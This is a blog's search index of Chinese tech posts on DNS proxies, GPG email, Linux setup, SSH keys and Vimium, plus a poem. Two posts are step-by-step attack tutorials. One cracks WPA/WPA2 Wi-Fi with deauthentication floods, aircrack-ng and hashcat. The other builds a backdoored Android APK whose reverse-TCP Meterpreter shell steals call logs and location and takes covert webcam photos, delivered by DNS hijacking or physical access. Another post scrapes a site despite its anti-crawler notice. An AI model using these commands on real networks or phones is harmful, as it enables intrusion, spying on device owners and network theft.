<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[使用Pcap_DNS搭建本地防污染DNS服务器]]></title>
    <url>%2F2018%2F04%2F14%2FPcap-DNSProxy-md%2F</url>
    <content type="text"><![CDATA[======================== DNS介绍 我们使用的互联网是基于TCP/IP协议的，而TCP/IP的基石是IP地址，所以在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，但对于人类来说，记住很多IP地址是件很困难的事情，于是发明了DNS（Domain Name System，域名系统），现在我们访问网站时，只需要输入相应的域名，就能看到所需要的页面。这是因为互联网上有一种叫“DNS服务器”的计算机会自动把我们的域名“翻译”成了相应的IP地址，并告诉我们。以访问百度为例www.baidu.com，系统会向DNS服务器（如8.8.8.8）发送请求：”嘿，我要用度娘，赶紧告诉我它的IP地址”，DNS服务器收到请求后，就会回复我们：”这是百度的ip地址，请查收“，系统收到IP地址后，便会和百度的服务器进行通信，最后得到我们看到的网页。 DNS的问题一般运营商（联通，电信，移动）都会搭建自己的DNS服务器，以提高响应速度，但是运营商会为了为了某些目的，会对DNS做一些手脚，导致我们无法通过域名解析出正确的IP地址。常用的手段有：DNS劫持和DNS污染。网上很多文章建议将DNS设为公共DNS（如阿里的223.5.5.5,谷歌的8.8.8.8,腾讯的119.29.29.29），但是你们也太小看运营商了，以移动为例：他们会对UDP53（DNS默认向53端口用UDP包发送查询请求）进行抢答。随便输入一个IP地址（8.1.2.3不是任何公共DNS服务器地址），都能给你返回查询结果。 解决方案这里介绍使用Pcap_DNSProxy搭建防污染防劫持的DNS服务器。Win/MacOS都有编译好的二进制文件，可以直接下载使用。 下文介绍Arch Linux下的Pcap_DNSProxy的编译与使用，其他环境请参考chengr28的官方文档 安装编译环境 sudo pacman -S gcc cmake libpcap libsodium openssl git bind-tools 下载源码 git clone https://github.com/chengr28/Pcap_DNSProxy.git 编译生成可执行文件 cd Pcap_DNSProxy/Source/Auxiliary/Scripts #进入指定目录chmod 755 CMake_Build.sh #赋予脚本执行权限./CMake_Build.sh #执行编译程序 编译成功后，Pcap_DNSProxy/Source/Release 目录下的文件即目标程序和配置文件，我们先来测试一下。 123cd ../../Release #切换到Relese目录sudo ./Pcap_DNSProxy --disable-daemon #调试运行dig @127.0.0.1 github.com #若能正常返回查询结果，即正常工作 设置开机自启 进入Release目录并编辑 Pcap_DNSProxy.service 文件，编辑完成后保存： WorkingDirectory= 项为程序所在目录的绝对路径(例如:/home/my/Pcap_DNSProxy/Source/Release)ExecStart= 项为程序所在目录的绝对路径，并在最后加上程序的名称(例如：/home/my/Pcap_DNSProxy/Source/Release/Pcap_DNSProxy) 自动安装到系统，并设为开机自启 sudo ./Linux_Install.Systemd.sh 修改系统DNS设置 12&gt; echo "nameserver 127.0.0.1\n" | sudo tee /etc/resolv.conf #修改系统DNS为127.0.0.1&gt;sudo chattr +i /etc/resolv.conf #其他网络管理程序可能会修改这个文件,设置特殊权限以避免被其他程序改动 再来测试一下,类似的结果即配置成功 其他 正常情况，Pcap_DNSProxy 可以做到开箱即用，你想做一些调整的话，可以修改配置文件Config.conf1234Outgoing Protocol = IPv4 + UDP + TCP #优先使用UDP，提高解析速度EDNS Label = 1 #EDNS 标签支持SOCKS Proxy = 1 #允许使用Sock5代理，以远程解析DNS请求SOCKS IPv4 Address = 127.0.0.1:1080 更详细配置请阅读文档 参考 https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F https://www.v2ex.com/t/442340#reply15 https://www.v2ex.com/t/360775 https://wiki.archlinux.org/index.php/Resolv.conf]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬取某站科学上网帐号]]></title>
    <url>%2F2018%2F04%2F07%2Fpython-getss%2F</url>
    <content type="text"><![CDATA[前言无意间发现了一个SS帐号分享站，但每次都需要手动获取帐号信息太麻烦了，这里用Python写一个爬虫来自动获取帐号信息。 分析先来看一下网站源码。站长做了防爬处理，数据并不保存在源代码中，并且针对爬虫常见的模拟浏览器手段进行检测。 看一下网络连接，发现了一个ss.json的get请求，内容居然帐号信息。本以为是站长特意留下的API接口，测试之后才发现里面的帐号信息都不能正常使用。现在只能老老实实的去分析源码了。网站关键部分是用javascript写的。123456789101112//用a，b 分别初始化x（key）,y(iv)var a = '1a52316b1ed72c8f';var b = 'cd3e6a7914085b2f';var c = '327bd961633a77c4';var x = CryptoJS.enc.Latin1.parse(a);var y = CryptoJS.enc.Latin1.parse(b);//post方法提交a,b,c,得到密文data$.post("data.php",&#123;a:a,b:b,c:c&#125;,function(data)&#123; //解密 var dec = CryptoJS.AES.decrypt(data,x,&#123;iv:y,mode:CryptoJS.mode.ECB,padding:CryptoJS.pad.Pkcs7&#125;); //格式化成json格式方便后面使用 var tbdt = $.parseJSON(dec.toString(CryptoJS.enc.Utf8))&#125; 可以看到流程如下 判断是否是正常的浏览器，如果正常，就用POST方法提交正确的a,b,c 参数，服务端会返回一串AES密文 用a，b分别初始化key，iv，用Crypto－js库去解密返回的数据 解密后，重新排版，优化显示 这里我们用Python去模拟整个过程 123456789101112131415161718192021222324252627import reimport base64import requestsfrom Crypto.Cipher import AESheaders = &#123;'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0'&#125;url= "https://free-ss.site/"url2="https://free-ss.site/data.php" #获取正确的a,b,c参数s = requests.session()html = s.get(url,headers=headers,timeout=3)a,b,c = re.findall(r"\'(.*?)\'",html.text)[6:9]#post提交a,b,c,得到密文p_data = &#123;'a':a,'b':b,'c':c&#125;msg = s.post(url2,headers=headers,data=p_data,timeout=3)endata = base64.b64decode(msg.text) #返回的是base64编码数据，先解码#用正确的参数初始化AES，ECB模式不需要iv向量key = bytes(a,encoding="utf-8")#iv = bytes(b,encoding="utf-8")aes = AES.new(key,AES.MODE_ECB)#解密得到数据data ＝ aes.decrypt(endata).decode('utf-8') 我们可以看到数据末尾多了一些无用字符，因为AES加密需要原始数据块是16位的倍数，不足则用按照某些标准(诸如源码中的Pkcs7)进行填充补位。我们继续处理解密后的数据，生成ss链接以方便直接导入12345678910import jsonss_data = re.findall(r'&#123;.*&#125;',data)[0] #去掉多余的填充字符ss_json = json.loads(ss_data)['data'] #json化数据for i in ss_json: #ss://method:password@server:port ss = "&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;".format(i[3],i[4],i[1],i[2]) ss_url = "ss://"+ bytes.decode( base64.b64encode(bytes(ss,encoding="utf8")) ) #print(ss) print(ss_url) 后来发现网站每次使用的加密方法都是随机的，Crypto-js一共实现了AES的5种加密模式:CBC、CFB、CTR、ECB、OFB,每种都用Python实现太麻烦了，这里我们取个巧：判断加密模式，如果是ECB，则进行解密，否则重新请求网页信息。整个Demo如下： 1234567891011121314151617181920212223242526272829303132import reimport base64import jsonimport requestsfrom Crypto.Cipher import AESif __name__ == '__main__': headers = &#123;'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0'&#125; url= "https://free-ss.site/" url2="https://free-ss.site/data.php" while(1): s = requests.session() html = s.get(url,headers=headers,timeout=3) mode = re.findall(r"CryptoJS.mode.(\w&#123;3&#125;)",html.text) print(mode) if 'ECB' in mode: a,b,c = re.findall(r"\'(.*?)\'",html.text)[6:9] p_data = &#123;'a':a,'b':b,'c':c&#125; msg = s.post(url2,headers=headers,data=p_data,timeout=3) endata = base64.b64decode(msg.text) key = bytes(a,encoding="utf-8") aes = AES.new(key,AES.MODE_ECB) data = aes.decrypt(endata).decode('utf-8') ss_data = re.findall(r'&#123;.*&#125;',data)[0] ss_json = json.loads(ss_data)['data'] for i in ss_json: #ss://method:password@server:port ss = "&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;".format(i[3],i[4],i[1],i[2]) ss_url = "ss://"+ bytes.decode( base64.b64encode(bytes(ss,encoding="utf8")) ) #print(ss) print(ss_url) break 后续这里只实现了核心功能，本来想完善一下放到Github上，但无意间有看到了一个名叫free-ss.site 生成全部链接的油猴脚本里有这段内容 原站HTML代码中添加了以下内容： 托各位大佬的福，本站爬虫访问量终于比真人访问量高了。本站在此谢过各位大佬。 本站长深知不太可能制止各位大佬的爬虫，现恳请各位大佬在发布账号的时候做以下处理： 乱序排序。人总是想偷懒的，大家都喜欢用靠前面的账号。 不要测速和测延迟。人总是逐利的。大家都喜欢用高速低延迟的账号。 这2点要求都是为了保护账号，让用户尽可能的分布到各个账号上。 如果全国人民一起使用某个账号，几乎等同于DDoS攻击，这样账号很快就失效了。 并且我也在网站源码里看到了:本站不欢迎各种爬虫,爬虫请自重！，因此放弃了这个打算。 本文仅供学习交流，如有冒犯之处，联系可删。 参考 https://blog.zhengxianjun.com/2015/05/javascript-crypto-js https://gist.github.com/marcoslin/8026990 https://bbs.pediy.com/thread-224363.htm]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[保护你的邮件通信——Mailvelope（GPG）]]></title>
    <url>%2F2018%2F03%2F29%2Fgpg%2F</url>
    <content type="text"><![CDATA[前言谈到隐私保护的时候人们最常说的话就是“我没什么可藏，我光明磊落，政府监控就监控吧，我不在乎”，或者“不做亏心事，不怕鬼敲门”,更极端的想法是“反正他们知道一切，我做啥都没用。” 爱德华·斯诺登表示：“我不在乎隐私权，因为我没什么好藏的”这样的观点，和“我不在乎言论自由，因为我没什么好说的”意思接近。当一个人说“我没什么好藏的”，实际上是在说“我不在乎自己的权利”，也就是“我不拥有权利，因为我无法为我的权利辩解”，而对权利的正确解读应该是“政府侵犯你的权利，政府才应该辩解”。[1] 虽然在大数据时代我们很难做到完全匿名，但我们依然可以通过加密手段在一定程度上保护自己的隐私。 加密可以保护我们的数据。无论数据是正存放在我们自己的计算机上，还是位于数据中心，或者正在通过互联网传送的途中，加密都可以提供防护。加密可以保护我们的聊天，不管是视频、语音还是文字。加密可以保护我们的隐私，可以隐藏我们的踪迹，甚至有时候，它会保护我们的性命。 这种保护是攸关我们每个人的。不需要太多解释就可以明白，加密对于活动于威权国家中的记者与人权或政治活动家的重要性。但加密同样也会保护不属于这些群体的其他人。加密抵御犯罪分子的入侵，抵御竞争对手的窃密，防止家庭成员或者邻居偷窥。加密防御的不只是有意的攻击者，还包括没有预料到的意外情况。[2] 下面介绍用Mailvelope在网页端上加密自己的电子邮件。 正文介绍Mailvelope是一种浏览器扩展，遵守OpenPGP标准[3]可以对电子邮件和文件进行加密，解密，签名和认证。它不需要您下载或安装其他邮件客户端，就可以为WebMail用户提供端到端加密的最简单方法。下载地址：Chrome版Firefox版 使用 安装完成后，点击Mailvelope的插件图标，点设置图标进入设置页面。 这里我们生成一个新的密钥,如果你已经有GPG密钥,可以直接导入。 导出你的公钥，文本框中的内容即为你的公钥，任何可以获得你公钥的人都可以给你发加密邮件 导入别人的公钥，有对方的公钥才能给它发送加密邮件。 进入你的网页邮箱，如果你的邮件服务商在mailvelope默认支持列表中，在写信框中会出现一个小图标。如果没有发现，请添加网站支持后，刷新页面生效。 点击小图标，会弹出对话框（这里貌似有一个bug，在弹出窗口右键单击才会显示内容）开始写内容。 撰写完成后点加密。发现已经变成了密文，即可发送给对方。(如果开启了签名，还需要输入你创建密钥时设置的密码才可以加密内容) 收到加密邮件，点一下，在弹出窗口输入你的私钥密码即可成功解密。 注意 Mailvelope 不会加密你的邮箱地址和对方的邮箱地址以及主题名，请不要使用真实姓名注册邮箱，如果可以尽量单独申请一个隐私性较好的邮箱服务商（比如ProtonMail）。 请妥善保存你的私钥，做好备份，以防丢失后无法解密数据 第一次给对方发送加密电子邮件时，可以放心的将你的公钥一并附上，以方便对方给你回复加密邮件。[4] 扩展阅读 GPG原理：https://xeodou.me/2015/09/13/how-pgp-works/ 隐私工具介绍：https://cybermagicsec.github.io/privacytools-zh/ 安全工具箱指南：https://securityinabox.org/zh/ 编程随想的隐私保护技巧：https://program-think.blogspot.com/2013/06/privacy-protection-0.html 参考[1] 维基百科：无所隐瞒论 https://zh.wikipedia.org/zh-sg/%E6%97%A0%E6%89%80%E9%9A%90%E7%9E%92%E8%AE%BA[2] 为什么要加密：https://www.neoatlantis.org/%E7%94%B5%E5%B7%A5%E7%94%B5%E5%AD%90%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF/2016/11/18/why-encrypt.html[3] OpenPGP标准：https://tools.ietf.org/html/rfc4880[4] Mailvelope指南：https://securityinabox.org/en/guide/mailvelope/web/]]></content>
      <tags>
        <tag>Privacy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Manjaro Linux 配置Intel与Nvidia双显卡切换]]></title>
    <url>%2F2018%2F03%2F19%2FBumblebee%2F</url>
    <content type="text"><![CDATA[BumblebeeBumblebee是一套Linux下双显卡切换的解决方案，通过它可以自由的切换集显与独立显卡，做到续航与性能的平衡。 安装Manjaro 提供了强大的硬件检测模块mhwd,可以很方便的安装各种驱动。 安装依赖 sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus 安装nvidia闭源驱动与intel驱动混合版bumblebee sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee 开启自动启动bumblebeed服务 sudo systemctl enable bumblebeed 将用户添加到bumblee组 sudo gpasswd -a $USER bumblebee 如果一切顺利的话，重启后就可以在你想运行的程序名前面加optirun,好使用独立显卡驱动你的应用程序。 但很大可能是重启后发现无法进入图形化界面,你可以尝试在Grub菜单启动界面按[E]编辑，找到quite并在后面加入(注意空格): acpi_osi=! acpi_osi=’Windows 2009’或者acpi_osi=! acpi_osi=Linux acpi_osi=’Windows 2015’ pcie_port_pm=off(很多硬件厂商的BIOS驱动都对Linux不友好，无法顺利加载ACPI模块，而导致无法驱动独立显卡,acpi_osi=’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，别闹情绪了，赶紧工作吧。)接着按[Ctrl]+[x]或[F10]保存更改并启动系统。 顺利进入系统后打开终端更改配置文件 sudo vim /etc/default/grub 给 “GRUB_CMLINE_LINUX_DEFAULT”添加你可以正常启动Linux的‘acpi_osi’参数，如图我用的是’Windows 2009’。 更新Grub文件,即可永久解决不能启动图形界面的问题 sudo update-grub 测试性能 安装测试软件 sudo pacman -S mesa-demos 集显性能 glxgears -info 独显性能 optirun glxgears -info 其他问题 NVIDIA面板无信息 optirun -b none nvidia-settings -c :8 不依赖Bumblebee来使用CUDA sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ‘ON’ 使用完CUDA 停止NVIDIA显卡 sudo rmmod nvidia_uvm nvidia &amp;&amp; sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; OFF 参考 https://gist.github.com/Misairu-G/616f7b2756c488148b7309addc940b28 https://wiki.manjaro.org/index.php?title=Configure_NVIDIA_(non-free)_settings_and_load_them_on_Startup https://wiki.archlinux.org/index.php/Bumblebee#Primusrun]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Aircrack&hashcat破解WPA/WPA2]]></title>
    <url>%2F2018%2F03%2F15%2Faircrack-hashcat%2F</url>
    <content type="text"><![CDATA[==================== 写在前面这里假定你用的是Manjaro Linux 系统，配置好独立显卡，本文提到的软件可以直接用sudo pacman -S aircrack-ng hashcat hashcat-utils安装,Kali Linux默认集成，其他环境请自行安装。 aircrack-ng:aircrack-ng是目前最热门的WiFi破解领域的软件。Aircrack-ng 套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。 hashcat:hashcat支持N多种算法，充分利用GPU性能，是目前最快的利用GPU破解Hash的软件。 USB无线网卡:推荐3070，8187，便宜好用（某宝十几块钱就能买到）,当然笔记本自带的无线网卡也可以。 由于hashcat使用GPU破解，因此需要安装依赖，sudo pacman -S ocl-icd opencl-nvidia,执行sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ON以让CUDA程序使用英伟达独立显卡。 hashcat -I看到你的独显信息就可以愉快的使用hashcat了。 Aircrack 查看无线网卡，我的网卡为wlan0 airmon-ng 将网卡设为监听模式 airmon-ng start wlan0执行iwconfig出现Mode:Monitor即执行成功，并可以看到网卡被重命名为wlan0mon。若执行失败，请先尝试airmon-ng check kill，依旧不行，请检查你的网卡驱动是否被支持 搜索目标 airodump-ng wlan0mon 12345BSSID:无线路由的MAC地址PWR：无线信号强度（绝对值越小表示信号越强）CH:信道号ENC:加密体系，常见WPA，WPA2，WEPESSID:扩展路由名称 这里以ELJNB为例，进行抓包： airodump-ng –bssid DC:FE:18:C4:20:E3 -o pcap -w my -c 1 wlan0mon 12345--bssid: 指定无线路由的MAC地址,这里是ELJNB的MAC地址-o:指定输出文件格式， 支持pcap, ivs, csv, gps, kismet, netxml-w:保存文件名称，会自动加01，02，03作为序号。-c:指定工作频道，ELJNB工作在频道1最后是你的网卡接口名称 注意STATION那列里的MAC地址，稍后会用到，并保持airodump-ng一直处于运行状态。 加速获取握手包我们可以使用泛洪攻击断开某设备的连接，迫使其重连,以顺利捕获我们需要的数据（含有WiFi的密码数据包）。新开一个终端，输入 aireplay-ng –deauth 1 –a DC:FE:18:C4:20:E3 -c E6:20:3A:A4:82:10 wlan0mon 123--deauth:取消验证洪水攻击，后面是攻击次数，0代表无限次数。-a:目标路由MAC地址-c:连到这个路由某的设备MAC地址，可以在STATION那列中随便选一个。 回到airodump-ng窗口,若在右上角发现WPA handshake ，即成功捕获数据。若不成功请多试几次。顺利捕获数据后就可以用Ctrl+C终止airodump-ng了。会发现它在当前路径生成了一个my-01.cap文件，现在可以进行最后一步,破解数据了。 暴力破解 在线破解：Online Hash Crack GPUHASH.me md5this 本地破解:aircrack-ng -w dict.txt my-01.cap这里破解速度就取决与你CPU性能和字典文件(dict.txt)够不够强大了。如果需要，可以从网上找一些字典文件aircrack-ng使用CPU破解，效率比较低，这里推荐hashcat，它可以使用GPU加速你的破解过程。 haschcathashcat需要特殊的hash数据包格式，因此需要先将airodump-ng抓取的数据包转换一下，在线转换或本地使hashcat-utils所提供的工具包 用cap2hccapx将cap转化为hccapx 开始暴力破解 hashcat -m 2500 test.hccapx dict.txt 123-m:hash类型 2500 为wpa/wpa2test.hccapx:数据包文件dict.txt:为字典文件 破解结束后，查看结果 cat ～/.hashcat/hashcat.porifle最后即为WiFi密码，关于hashcat高级使用方式，见wooyun 扩展可以看到，整个过程无非两步，第一步抓取WPA handshake数据包，第二步暴力破解数据文件。因此可以使用更强大的工具wlandump-ng：一次性从附近的网络上抓取所有的 handshake 信息，而实现快速破解WiFi,详情见wifi-cracking和hcxtools 最大的安全隐患永远是人，优先使用WiFi万能钥匙也许会有意外惊喜(配合手机自带的WiFi分享功能，可以直接得到密码)。 参考 https://www.bennythink.com/wifi-cracking.html https://klionsec.github.io/2015/04/14/aircrack-hascat/ http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/ https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=21342&amp;highlight=wifi]]></content>
      <tags>
        <tag>WiFi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[终端环境之Zsh＆oh-my-zsh]]></title>
    <url>%2F2018%2F03%2F14%2Foh-my-zsh%2F</url>
    <content type="text"><![CDATA[============== 终极 Shell(zsh)介绍 Z Shell(Zsh) 是一种Unix shell，它可以用作为交互式的登录shell，也是一种强大的shell脚本命令解释器。它在兼容 Bash 的同时 (默认不兼容，除非设置成 emulate sh) 还提供了很多改进。 改进特性: 色彩高亮 更强大的自动补全 支持通配符搜索 兼容Bash 完全可定制化 安装 sudo pacman -S zsh zsh-completions 此处为Arch Linux，其他平台请使用自带的包管理器，为了使用更强大的补全功能建议同时安装 zsh-completions包 使用 将zsh设为默认shell chsh -s /bin/zsh 其他发行版可先用chsh -l 查看zsh安装位置 Oh-my-zsh curl 和 git 应该已被安装(若没有Arch 用sudo pacman -S curl git 安装，其他发行版类似。) Oh-my-zsh是一个傻瓜化的zsh配置管理框架，提供了大量实用的功能，主题等。做到开箱即用，现在基本成为了Zsh的标配。 安装 1sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)" 配置文件位置： ~/.zshrc 主题oh-my-zsh自带大量Themes，默认为robbyrussell。你也可以选择random，即每次打开终端随机选一个主题。 ZSH_THEME=”你喜欢的主题名” 常用插件 git: 提供大量git的Aliases，详情 archlinux： 提供一些pacman包管理器的Aliases，详情 z：经常使用cd 切换路径，积累一定数据后可用z快速跳转到指定位置 sudo：按两次[Esc]自动在前面加sudo pip： 补全pip 命令 zsh-autosuggestions: 根据历史记录进行智能提示(按 ctrl+E 是正确姿势)。非oh-my-zsh自带，用git下载安装 1git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions zsh-syntax-highlighting：命令高亮，正确显示绿色，错误为红色。非oh-my-zsh自带，用git下载安装 1git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting plugins=( 你想启用的插件，空格分隔 ) 重新加载配置文件，立刻生效。 source ~/.zshrc 其他插件请参见官方wiki 少即是多，启用大量插件会严重拖慢zsh启动速度 参考 https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) http://zsh.sourceforge.net/FAQ/zshfaq01.html#l4 https://en.wikipedia.org/wiki/Z_shell http://macshuo.com/?p=676]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[笔记本安装 Manjaro Linux]]></title>
    <url>%2F2018%2F03%2F09%2Farchlinuxcn%2F</url>
    <content type="text"><![CDATA[==================== Manjaro简介Manjaro Linux是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自DistroWatch），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它有自己的专用软件仓库和更稳定的软件包、可以轻松安装和使用多个内核。 无法进入安装程序 如果自动图形界面启动不了，卡在以下位置： Started TLP system startup/shutdown A start job is running for livemedia mhwd scripe(xx s/no limit) 可尝试添加内核参数 看到启动菜单,用方向键移动选中boot项，按[E]键编辑 把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下: driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’ 修改完成后按[F10]启动，并完成安装。 配置 archlinuxcn 源archlinuxcn 简介Arch Linux 中文社区仓库 是由 Arch Linux 中文社区驱动的非官方用户仓库。包含大量中文用户常用软件、工具、字体/美化包等。 启用archlinuxcn库 修改配置文件 sudo nano /etc/pacman.conf 在文末添加 [archlinuxcn]Server = https://mirrors.zju.edu.cn/archlinuxcn/$arch 添加PGP密钥 sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring 测试 sudo pacman -S yaourt 以后就可以直接使用 yaourt softname 搜索并安装AUR库中的软件。 安装中文输入法 推荐Rime sudo pacman -S fcitx-im fcitx-configtool fcitx-rime Rime扩展增强词库 创建配置文件 vim ~/.xprofile 123export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot; 注销生效 其他常用软件 albert: 谁用谁知道的效率增强神器 chromium: Chrome浏览器 deepin-wechat: Linux下微信解决方案 goldendict: 功能强大的词典软件 keepassxc: 跨平台的本地密码管理器 noto-fonts-cjk: 中文字体，当然还有文泉系列(wqy-microhei) proxychains-ng: 你懂的 virtualbox: 开源、轻巧，快速的虚拟机软件 zsh: 人生苦短，我用zsh vlc：本地媒体播放器 visual-studio-code-bin： 微软发布的开源代码编辑器，支持多种语言。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH免密登录]]></title>
    <url>%2F2018%2F03%2F07%2Fssh-keygen%2F</url>
    <content type="text"><![CDATA[======================== SSH单密钥配置 生成ssh密钥文件 ssh-keygen -t ecdsa -b 521 1234-t 为指定加密算法类型，支持rsa，dsa，ecdsa-b 指定密钥大小，ecdsa算法默认大小为256位ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高 如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。 将公钥上传到远程服务器 ssh-copy-id username@remote_ip ssh-copy-id会将你刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中 测试 ssh username@remote_ip SSH多密钥配置 生成密钥 ssh-keygen -t ecdsa -b 521 -f ~/.ssh/one -C “remote_ip” 12-f 指定生成密钥保存位置与名称 建议放到 $HOME/.ssh/目录下-C 添加注释，类如邮箱，远程主机IP，用户名之类，默认为本机主机名和用户 将公钥上传到远程服务器 ssh-copy-id -i ~/.ssh/one.pub username@remote_ip 1-i 指定上传公钥名称 创建SSH配置文件来管理多组密钥 vim ~/.ssh/config 123456Host remote_ip1 IdentitiesOnly yes IdentityFile ~/.ssh/oneHost remote_ip2 IdentitiesOnly yes IdentityFile ~/.ssh/two Host后面写: 远程主机ip地址IdentityFile后面写 你创建的密钥位置与名称 测试 ssh username@remote_ip 其他 将本地文件上传到远程主机 scp local_file remote_username@remote_ip:remote_folder 将远程主机中的文件下载到本地 scp remote_username@remote_ip:remote_file local_folder 参考 https://wiki.archlinux.org/index.php/SSH_keys http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生成apk后门实现msf控制安卓手机]]></title>
    <url>%2F2018%2F03%2F02%2Fbackdoor-apk%2F</url>
    <content type="text"><![CDATA[======================== 实验环境： Kali Linux android 同一局域网 生成后门安装依赖环境 apt-get install lib32z1 lib32ncurses5 lib32stdc++6 下载 backdoor-apk git clone https://github.com/dana-at-cp/backdoor-apk.git 下载完成后进入文件目录 cd backdoor-apk/backdoor-apk 将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行 ./backdoor-apk.sh test.apkPS:test.apk 为事先准备好的正常apk应用名 选择payload 出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件 meterpreter执行 msfconsole -r backdoor-apk.rc 手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell可以看到获得反弹shell 会话用sessions -i number 切换到当前会话此处执行check_root 测试其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等 可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样12345use exploit/multi/handler set payload android/meterpreter/reverse_tcp set lhost 192.168.0.105 set lport 8888 exploit 问题 [!] Failed to recompile original project with backdoor 现在很多应用都会做一些处理防止反编译，可以上 APKPure 或酷安 去找一些历史版本会增加成功概率 apktools 过旧，可以把Kail 更到最新 一定要把 apk 放到backdoor-apk.sh 所在目录下 拓展 外网环境可使用vps转发 或 ngrok穿透 参考 vps 转发 http://www.freebuf.com/sectool/136574.html ngrok穿透 http://www.freebuf.com/sectool/162046.html 植入木马方式 内网dns劫持: http://www.freebuf.com/sectool/136574.html 物理接触 参考 http://www.secist.com/archives/680.html http://www.4hou.com/mobile/8290.html]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vimium 入门]]></title>
    <url>%2F2018%2F02%2F28%2Fvimium%2F</url>
    <content type="text"><![CDATA[======================== vimium 介绍Vimium 是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升,一定要试试这个插件。 下载地址：ChromeFirefox Vimium使用总结 页内浏览 j:向下滚动一点 k:向上滚动一点 gg:到页面最底部 G:到页面最底部 d:向下翻一屏 u:向上翻一屏 gs:查看源代码 gi:聚焦到第一个输入点 i/Esc: 输入模式/命令模式 快速选取 /:快速查找 [n] 向下匹配项 [N]向上匹配 yy:拷贝当前页面的URL yf:拷贝指定URL V:选取指定段内容 标签操作 t:创建一个新标签 T:显示所有标签 J:上一个标签 K:下一个标签 x:关闭当前标签 X:恢复上个关闭的标签 r:重新加载 [F5] 导航操作 p/P : 打开剪贴板内的链接,否则进行搜索 o/O:从收藏夹、历史记录打开网址：如果你输的是一个网址，可以直接回车。 f/F: 快速打开某链接 gf：跳到父页面 H:回退上一个历史页面 [&lt;-] L:回到下一个历史页面 [-&gt;] 浏览器快捷键 ctrl+w: 关闭当前页面 ctrl+t: 新建标签 F6: 在当前页面输入URL ctrl+d: 为当前页添加书签 其他某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带的快捷键。]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随笔・一]]></title>
    <url>%2F2018%2F02%2F16%2Fpoetry%2F</url>
    <content type="text"><![CDATA[=========================== 喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。 初心捡起一段坚韧的丝线，串起断线的曾经。抓住夏的尾巴，将时钟拨到最初。夏花灿烂那时，是我们的开始。贪念着空气里的丝丝香甜， 就这样静静地，静静地望着你。截一段甜到发稠的岁月，缓缓流淌在时光里。折一只小船，轻轻飘荡到你的心房。小船轻触你内心的柔软，扒开你坚硬的外壳。 原来你是最初的心动，是夏日最绵软的清风。我想如果我爱你，可是我发现不是如果，我一直都在爱你。 &ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;—— 李十四 非原创，经原作者授权而发布于此。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
